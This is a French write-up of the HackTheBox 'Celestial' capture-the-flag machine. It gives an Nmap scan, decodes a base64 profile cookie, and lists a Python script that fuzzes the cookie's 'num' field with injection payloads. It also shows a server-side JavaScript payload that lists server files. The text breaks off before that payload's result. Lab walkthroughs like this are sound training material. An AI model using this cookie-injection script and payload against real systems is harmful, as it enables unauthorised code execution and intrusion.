# Solution du CTF Celestial de HackTheBox

Back to the root(s)
-------------------

En attendant la venue d'un nouveau CTF basé sur Windows sur [HackTheBox](https://www.hackthebox.eu/), je me suis penché sur différentes machines sous Linux.  

*Celestial* était l'une de celles-ci.  

2 + 2 = 22
----------

J'ai commencé par le classique scan de ports Nmap, ici un peu plus poussé via l'utilisation de plus de scripts :  

```plain
nmap -T5 --script safe -sC -sV -p- -A -oA scan 10.10.10.85
```

La seule chose à retenir c'est la présence du port 3000 ouvert ainsi que de nombreux ports non filtrés, ce qui peut être utile pour la suite :  

```plain
Not shown: 63272 closed ports, 2262 filtered ports
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-comments-displayer: Couldn't find any comments.
|_http-date: Wed, 22 Aug 2018 09:49:39 GMT; -4s from local time.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers:
|   X-Powered-By: Express
|   Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Wed, 22 Aug 2018 10:04:44 GMT; HttpOnly
|   Content-Type: text/html; charset=utf-8
|   Content-Length: 12
|   ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
|   Date: Wed, 22 Aug 2018 09:49:44 GMT
|   Connection: close
```

On voit clairement la mention de *Nodejs*. Au vu du numéro de port peu banal pour un service web j'ai d'abord pensé qu'il s'agissait d'un service de débogage à distance, j'ai donc lancé le module *Metasploit* *multi/misc/nodejs\_v8\_debugger* mais ceci n'a mené nul part, la réponse n'était clairement pas celle attendue par *Metasploit* je faisais fausse route.  

Je pointe donc mon browser sur ce port 3000 et j'obtiens une erreur HTTP. Un reload de la page plus tard et on a le message *Hey Dummy 2 + 2 is 22*.  

Il n'y a que [Javascript pour sortir cela bien sûr](https://gfycat.com/fr/gifs/detail/offensivefarflungbluefish) (oh no! It's retarded!) et c'est indice suffisant pour ce qui va venir.  

Si le message vient après un reload c'est parce qu'un cookie a été défini par le site. On le voit d'ailleurs dans le scan Nmap et il peut se décoder via base64 ce qui nous donne un dictionnaire JSON :  

```python
{
  "username":"Dummy",
  "country":"Idk Probably Somewhere Dumb",
  "city":"Lametown",
  "num":"2"
}
```

Attaquer les valeurs du dictionnaire n'est pas vraiment compliqué pour qui maîtrise bien Python (ou un autre vrai langage de programmation héhéhé).  

On part du même dictionnaire que l'on modifie dans une boucle que l'on sérialise en JSON pour ensuite encoder en base64 la chaîne obtenue transmise alors dans le cookie.  

Ma remière tentative a consisté à bruteforcer le champ *username* sans succès.  

Comme on est en face de Javascript il s'agit probablement d'une faille d'injection de code, auquel cas l'injection est à faire dans le champ *num*

Pour attaquer sans trop de difficultés ce champ j'ai écrit le script suivant, il suffit alors de lui passer un fichier avec les payloads :  

```python
import sys
import json
from urllib.parse import quote
from base64 import b64encode

import requests
from requests.exceptions import RequestException

data = {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
KEY = "num"
sess = requests.session()

wordlist = sys.argv[1]
with open(wordlist) as fd:
    for line in fd:
        word = line.strip()
        data["num"] = word

        try:
            raw = json.dumps(data).encode()
        except UnicodeEncodeError:
            continue
        else:
            raw = quote(b64encode(raw))
            try:
                response = sess.get(
                    "http://10.10.10.85:3000/",
                    headers={"cookie": "profile={}".format(raw)}
                )
            except RequestException:
                continue
            else:
                print(response.status_code, word)
                print(response.content)
```

Pour les payloads intéressants on peut se baser [sur cette page](https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_server_side_js_injection.html) et commencer ainsi par l'injection suivante :  

```javascript
;res.end(require('fs').readdirSync('.').toString())
```

Ce qui nous retourne le contenu suivant :  


*Published August 25 2018 at 18:19*